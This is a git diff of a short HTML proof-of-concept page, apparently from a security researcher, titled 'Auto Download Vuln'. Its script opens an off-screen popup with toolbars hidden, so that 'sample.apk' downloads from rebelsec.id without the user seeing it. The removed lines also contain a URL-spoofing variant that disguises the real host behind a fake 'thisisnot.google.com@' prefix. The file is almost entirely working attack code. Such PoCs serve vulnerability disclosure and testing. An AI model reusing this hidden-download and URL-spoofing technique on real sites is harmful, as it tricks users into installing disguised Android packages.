@@ -2,28 +2,21 @@
 <html lang="id">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Popup dua tombol</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Auto Download Vuln</title>
 </head>
 <body>
-  <button id="btn1">Download 1 (rebelsec.id)</button>
-  <button id="btn2">Download 2 (Long)</button>
+  <button id="downloadBtn">Auto Download (rebelsec.id)</button>
 
   <script>
-    function poc(url, name){
-      // fitur popup sama seperti aslinya
-      const features = "scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=1000,height=1000,left=-1000,top=-1000";
-      window.open(url, name, features);
-    }
-
-    document.getElementById('btn1').addEventListener('click', function (e) {
+    document.getElementById('downloadBtn').addEventListener('click', function(e) {
       e.preventDefault();
-      poc("https://rebelsec.id/sample.apk", "qq");
-    });
-
-    document.getElementById('btn2').addEventListener('click', function (e) {
-      e.preventDefault();
-      poc("http://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb.thisisnot.google.com@rebelsec.id/sample.apk", "qq2");
+      // buka popup seperti aslinya
+      window.open(
+        "https://rebelsec.id/sample.apk", 
+        "downloadWindow",
+        "scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=1000,height=1000,left=-1000,top=-1000"
+      );
     });
   </script>
 </body>
